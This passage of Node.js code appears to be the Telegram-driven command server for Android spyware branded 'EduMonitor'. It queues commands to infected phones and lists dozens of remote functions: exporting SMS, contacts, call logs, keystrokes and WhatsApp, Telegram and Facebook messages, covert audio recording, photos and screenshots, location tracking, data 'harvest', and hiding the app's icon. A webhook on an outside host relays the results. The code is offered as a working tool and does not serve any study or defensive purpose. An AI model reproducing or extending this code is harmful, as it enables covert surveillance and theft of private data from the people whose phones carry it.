    const cleanCommand = command.startsWith('/') ? command.substring(1) : command;
    
    device.pendingCommands.push({
        command: cleanCommand,
        originalCommand: command,
        messageId: messageId,
        timestamp: Date.now()
    });
    
    console.log(`📝 Command queued for device ${selectedDeviceId}: ${cleanCommand}`);
    
    await sendTelegramMessage(chatId, `✅ Command sent: ${command}\n📱 Device: ${device.deviceInfo?.model || 'Unknown'}`);
}

// ============= START SERVER =============

app.listen(PORT, '0.0.0.0', () => {
    const serverIP = getServerIP();
    console.log('\n🚀 ===============================================');
    console.log(`🚀 EduMonitor Server v6.0 - Consolidated Commands`);
    console.log(`🚀 Server IP: ${serverIP}`);
    console.log(`🚀 Port: ${PORT}`);
    console.log(`🚀 Webhook URL: https://edu-hwpy.onrender.com/webhook`);
    console.log(`🚀 Authorized chats: ${Array.from(authorizedChats).join(', ')}`);
    console.log('\n✅ CONSOLIDATED COMMANDS (45+ from 95+):');
    console.log('   📋 /help - Complete help menu');
    console.log('   📱 /device_info - Complete device info');
    console.log('   🌐 /network_info - Complete network info');
    console.log('   📱 /mobile_info - Complete mobile & SIM info');
    console.log('   📸 /screenshot - Take screenshot');
    console.log('   ⚙️ /screenshot_settings - Screenshot settings');
    console.log('   🎤 /start_60s_rec - Start 60s recording');
    console.log('   ⏹️ /stop_60s_rec - Stop recording');
    console.log('   📊 /record_info - Recording information');
    console.log('   🎚️ /audio_ultra/low/medium/high - Audio quality');
    console.log('   📇 /contacts - Export contacts');
    console.log('   💬 /sms - Export SMS');
    console.log('   📞 /calllogs - Export call logs');
    console.log('   📱 /apps_list - Export apps');
    console.log('   ⌨️ /keys - Export keystrokes');
    console.log('   🔔 /notify - Export notifications');
    console.log('   📱 /open_app - Export app opens');
    console.log('   💬 /whatsapp - WhatsApp logs');
    console.log('   💬 /telegram - Telegram logs');
    console.log('   💬 /facebook - Facebook logs');
    console.log('   🌐 /browser - Browser history');
    console.log('   📋 /clipboard - Clipboard logs');
    console.log('   📅 /calendar - Calendar events');
    console.log('   🔍 /scan_all - Full system scan');
    console.log('   🎵 /scan_media - Media scan');
    console.log('   🔑 /rt_keys_on/off - Keystroke real-time');
    console.log('   🔔 /rt_notif_on/off - Notification real-time');
    console.log('   ✅ /rt_all_on/off - All real-time');
    console.log('   📡 /saving_status - Network saving status');
    console.log('   📡 /wifi_only_on/off - WiFi-only mode');
    console.log('   🔄 /sync_all - Sync all data');
    console.log('   ⚡ /force_harvest - Force harvest');
    console.log('   📊 /logs_count - Database stats');
    console.log('   🗑️ /clear_logs - Clear logs');
    console.log('   🔄 /reboot_app - Reboot services');
    console.log('   👻 /hide_icon - Hide icon');
    console.log('   👁️ /show_icon - Show icon');
    console.log('   📍 /location - Get location');
    console.log('   🔋 /battery - Battery status');
    console.log('   💾 /storage - Storage info');
    console.log('   🕐 /time - Current time');
    console.log('   📸 /photo - Take photo');
    console.log('   🔄 /camera_switch - Switch camera');
    console.log('\n🚀 All existing features preserved (test menu, device stats, etc.)');
    console.log('🚀 ===============================================\n');
});
